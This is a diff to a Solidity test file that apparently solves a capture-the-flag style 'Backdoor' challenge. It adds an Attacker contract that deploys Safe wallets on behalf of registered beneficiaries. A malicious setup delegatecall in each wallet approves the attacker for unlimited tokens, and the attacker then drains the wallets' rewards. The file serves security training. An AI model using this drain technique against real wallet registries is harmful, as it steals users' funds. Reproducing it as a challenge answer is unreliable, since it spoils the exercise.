@@ -7,6 +7,80 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+
+contract Attacker {
+    Safe singletonCopy;
+    SafeProxyFactory walletFactory;
+    DamnValuableToken token;
+    WalletRegistry walletRegistry;
+    address[] beneficiaries;
+    address recovery;
+    uint immutable AMOUNT_TOKENS_DISTRIBUTED;
+    
+    constructor(
+        Safe _singletonCopy,
+        SafeProxyFactory _walletFactory,
+        DamnValuableToken _token,
+        WalletRegistry walletRegistryAddress,
+        address[] memory _beneficiaries,
+        address recoveryAddress,
+        uint amountTokensDistributed
+    ) payable {
+        singletonCopy = _singletonCopy;
+        walletFactory = _walletFactory;
+        token = _token;
+        walletRegistry = walletRegistryAddress;
+        beneficiaries = _beneficiaries;
+        recovery = recoveryAddress;
+        AMOUNT_TOKENS_DISTRIBUTED = amountTokensDistributed;
+    }
+    
+    function approveTokens(DamnValuableToken _token, address spender) external {
+        _token.approve(spender, type(uint256).max);
+    }
+    
+    function attack() public {
+        for (uint i = 0; i < beneficiaries.length; i++) {
+            address newOwner = beneficiaries[i];
+            address[] memory owners = new address[](1);
+            owners[0] = newOwner;
+            
+            bytes memory maliciousData = abi.encodeCall(
+                this.approveTokens,
+                (token, address(this))
+            );
+            
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup,
+                (
+                    owners,
+                    1,
+                    address(this),
+                    maliciousData,
+                    address(0),
+                    address(0),
+                    0,
+                    payable(address(0))
+                )
+            );
+            
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                initializer,
+                1,
+                walletRegistry
+            );
+            
+            token.transferFrom(
+                address(proxy),
+                address(this),
+                token.balanceOf(address(proxy))
+            );
+        }
+        token.transfer(recovery, AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +144,17 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(
+            singletonCopy,
+            walletFactory,
+            token,
+            walletRegistry,
+            users,
+            recovery,
+            AMOUNT_TOKENS_DISTRIBUTED
+        );
+        attacker.attack();
+
     }
 
     /**
